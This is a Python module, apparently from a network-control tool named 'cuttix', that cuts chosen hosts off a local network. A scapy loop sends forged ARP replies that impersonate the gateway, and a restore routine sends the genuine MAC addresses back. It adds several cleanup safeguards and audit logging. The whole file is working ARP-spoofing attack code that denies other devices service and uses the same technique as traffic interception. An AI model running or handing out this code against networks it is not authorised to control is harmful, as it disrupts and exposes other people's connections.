"""ARP controller — cut/restore network access via ARP spoofing.

Kill switch layers:
  1. atexit handler        (clean exit)
  2. signal handler        (SIGINT, SIGTERM)
  3. HMAC-signed state file (survives kill -9)
  4. auto-restore timer    (time-based failsafe)
"""
from __future__ import annotations

import atexit
import logging
import os
import signal
import sys
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timedelta
from typing import Any

from scapy.all import ARP, Ether, send, srp, getmacbyip, get_if_hwaddr, get_if_addr  # type: ignore[import]

from cuttix.core.audit_log import AuditLog
from cuttix.core.event_bus import Event, EventBus, EventType
from cuttix.core.exceptions import (
    AlreadySpoofedError,
    HostNotFoundError,
    NotSpoofedError,
    SecurityError,
)
from cuttix.modules.arp_state import ARPStateFile, SpoofEntry
from cuttix.utils.network import get_gateway_ip

logger = logging.getLogger(__name__)

# packets to send when restoring — enough for ARP tables to update
_RESTORE_ROUNDS = 5
_RESTORE_DELAY = 0.3


@dataclass
class _SpoofCtx:
    """Runtime context for an active spoof."""
    target_ip: str
    target_mac: str
    gateway_ip: str
    gateway_mac: str
    started: datetime
    auto_restore_at: datetime | None
    stop: threading.Event


class ARPController:
    """Network access control via ARP spoofing."""

    def __init__(
        self,
        interface: str,
        event_bus: EventBus | None = None,
        audit_log: AuditLog | None = None,
        state_file: ARPStateFile | None = None,
    ) -> None:
        self._iface = interface
        self._bus = event_bus
        self._audit = audit_log
        self._state = state_file or ARPStateFile()

        # our own addresses
        self._own_ip = get_if_addr(self._iface)
        self._own_mac = get_if_hwaddr(self._iface)

        # gateway
        self._gw_ip = get_gateway_ip() or ""
        self._gw_mac = self._resolve_mac(self._gw_ip) if self._gw_ip else ""

        # active spoofs keyed by target IP
        self._active: dict[str, _SpoofCtx] = {}
        self._lock = threading.Lock()

        # -- kill switch layers --
        # layer 1: atexit
        atexit.register(self._cleanup)

        # layer 2: signals (only on main thread)
        if threading.current_thread() is threading.main_thread():
            for sig in (signal.SIGINT, signal.SIGTERM):
                try:
                    signal.signal(sig, self._sig_handler)
                except (OSError, ValueError):
                    pass

        # layer 3: recover orphaned state from previous crash
        self._recover_orphans()

    # -- public API matching the ARPControl Protocol --

    def cut_access(self, target_ip: str, auto_restore_minutes: int = 0) -> None:
        """Cut a host's network access."""
        self._safety_checks(target_ip)

        target_mac = self._resolve_mac(target_ip)
        if not target_mac:
            raise HostNotFoundError(
                f"Can't resolve MAC for {target_ip} — is the host online?"
            )

        # audit BEFORE action
        if self._audit:
            self._audit.log_action(
                action="CUT",
                target_ip=target_ip,
                target_mac=target_mac,
                operator_ip=self._own_ip,
                auto_restore_minutes=auto_restore_minutes,
            )

        auto_at = None
        if auto_restore_minutes > 0:
            auto_at = datetime.now() + timedelta(minutes=auto_restore_minutes)

        stop_evt = threading.Event()
        ctx = _SpoofCtx(
            target_ip=target_ip,
            target_mac=target_mac,
            gateway_ip=self._gw_ip,
            gateway_mac=self._gw_mac,
            started=datetime.now(),
            auto_restore_at=auto_at,
            stop=stop_evt,
        )

        with self._lock:
            self._active[target_ip] = ctx

        self._persist()

        # spoof thread — NOT daemon so it can send restore packets on exit
        t = threading.Thread(
            target=self._spoof_loop,
            args=(ctx,),
            name=f"arp-{target_ip}",
        )
        t.start()

        if self._bus:
            self._bus.publish(Event(
                type=EventType.HOST_CUT,
                data={
                    "target_ip": target_ip,
                    "target_mac": target_mac,
                    "auto_restore_minutes": auto_restore_minutes,
                },
                source="arp_control",
            ))

        logger.info("Cut %s (%s)", target_ip, target_mac)

    def restore_access(self, target_ip: str) -> None:
        """Restore a host's network access."""
        with self._lock:
            ctx = self._active.get(target_ip)
        if not ctx:
            raise NotSpoofedError(f"{target_ip} is not being spoofed")

        self._do_restore(ctx)

        with self._lock:
            self._active.pop(target_ip, None)
        self._persist()

        if self._audit:
            self._audit.log_action(
                action="RESTORE",
                target_ip=target_ip,
                target_mac=ctx.target_mac,
                operator_ip=self._own_ip,
            )

        if self._bus:
            self._bus.publish(Event(
                type=EventType.HOST_RESTORED,
                data={"target_ip": target_ip, "target_mac": ctx.target_mac},
                source="arp_control",
            ))

        logger.info("Restored %s (%s)", target_ip, ctx.target_mac)

    def restore_all(self) -> None:
        """Restore every spoofed host."""
        with self._lock:
            targets = list(self._active.keys())

        for ip in targets:
            try:
                self.restore_access(ip)
            except NotSpoofedError:
                pass
            except Exception:
                logger.exception("Failed to restore %s", ip)

    def get_spoofed(self) -> dict[str, Any]:
        """Return dict of target_ip → info for all active spoofs."""
        with self._lock:
            return {
                ip: {
                    "target_mac": ctx.target_mac,
                    "started": ctx.started.isoformat(),
                    "auto_restore_at": (
                        ctx.auto_restore_at.isoformat()
                        if ctx.auto_restore_at else None
                    ),
                }
                for ip, ctx in self._active.items()
            }

    def is_spoofed(self, target_ip: str) -> bool:
        with self._lock:
            return target_ip in self._active

    # -- internal --

    def _spoof_loop(self, ctx: _SpoofCtx) -> None:
        """Send fake ARP replies in a loop until stopped."""
        while not ctx.stop.is_set():
            # layer 4: check auto-restore timer
            if ctx.auto_restore_at and datetime.now() >= ctx.auto_restore_at:
                logger.info(
                    "Auto-restore timer expired for %s", ctx.target_ip
                )
                try:
                    self.restore_access(ctx.target_ip)
                except Exception:
                    logger.exception("Auto-restore failed for %s", ctx.target_ip)
                return

            try:
                # tell target: we are the gateway
                send(ARP(
                    op=2,
                    psrc=ctx.gateway_ip,
                    hwsrc=self._own_mac,
                    pdst=ctx.target_ip,
                    hwdst=ctx.target_mac,
                ), iface=self._iface, verbose=False)
            except OSError:
                logger.warning("Interface down, stopping spoof for %s", ctx.target_ip)
                break

            ctx.stop.wait(1.0)

    def _do_restore(self, ctx: _SpoofCtx) -> None:
        """Stop spoof loop and send legitimate ARP replies."""
        ctx.stop.set()

        for _ in range(_RESTORE_ROUNDS):
            try:
                # tell target the real gateway MAC
                send(ARP(
                    op=2,
                    psrc=ctx.gateway_ip,
                    hwsrc=ctx.gateway_mac,
                    pdst=ctx.target_ip,
                    hwdst=ctx.target_mac,
                ), iface=self._iface, verbose=False)

                # tell gateway the real target MAC
                send(ARP(
                    op=2,
                    psrc=ctx.target_ip,
                    hwsrc=ctx.target_mac,
                    pdst=ctx.gateway_ip,
                    hwdst=ctx.gateway_mac,
                ), iface=self._iface, verbose=False)
            except OSError:
                break
            time.sleep(_RESTORE_DELAY)

    def _safety_checks(self, target_ip: str) -> None:
        if target_ip == self._own_ip:
            raise SecurityError("Can't spoof yourself")
        if target_ip == self._gw_ip:
            raise SecurityError(
                "Spoofing the gateway would kill your own connection"
            )
        with self._lock:
            if target_ip in self._active:
                raise AlreadySpoofedError(f"{target_ip} already spoofed")

    def _resolve_mac(self, ip: str) -> str:
        """ARP resolve an IP to its MAC address."""
        if not ip:
            return ""
        try:
            mac = getmacbyip(ip)
            return mac.lower() if mac else ""
        except Exception:
            return ""

    def _persist(self) -> None:
        """Write current state to the HMAC-signed file."""
        with self._lock:
            entries = [
                SpoofEntry(
                    target_ip=ctx.target_ip,
                    target_mac=ctx.target_mac,
                    gateway_ip=ctx.gateway_ip,
                    gateway_mac=ctx.gateway_mac,
                    started_at=ctx.started.isoformat(),
                    auto_restore_at=(
                        ctx.auto_restore_at.isoformat()
                        if ctx.auto_restore_at else None
                    ),
                )
                for ctx in self._active.values()
            ]

        if entries:
            self._state.save(entries)
        else:
            self._state.remove()

    def _recover_orphans(self) -> None:
        """Layer 3: restore hosts left spoofed after a crash."""
        entries = self._state.load()
        if not entries:
            return

        logger.warning(
            "Found %d orphaned spoof(s) from previous crash — restoring",
            len(entries),
        )

        for entry in entries:
            for _ in range(10):  # extra rounds for reliability
                try:
                    send(ARP(
                        op=2,
                        psrc=entry.gateway_ip,
                        hwsrc=entry.gateway_mac,
                        pdst=entry.target_ip,
                        hwdst=entry.target_mac,
                    ), iface=self._iface, verbose=False)
                except OSError:
                    break
                time.sleep(0.2)

            if self._audit:
                self._audit.log_action(
                    action="ORPHAN_RESTORE",
                    target_ip=entry.target_ip,
                    target_mac=entry.target_mac,
                    operator_ip=self._own_ip,
                )

            logger.info("Orphan-restored %s (%s)", entry.target_ip, entry.target_mac)

        self._state.remove()

    def _cleanup(self) -> None:
        """Layers 1+2: restore everything on exit or signal."""
        with self._lock:
            if not self._active:
                return
            contexts = list(self._active.values())

        logger.info("Restoring %d spoofed host(s) on shutdown", len(contexts))
        for ctx in contexts:
            self._do_restore(ctx)

        self._state.remove()

    def _sig_handler(self, signum: int, frame: Any) -> None:
        sig_name = signal.Signals(signum).name
        logger.info("Caught %s — restoring all hosts", sig_name)
        self._cleanup()
        # re-raise so Python exits
        sys.exit(128 + signum)
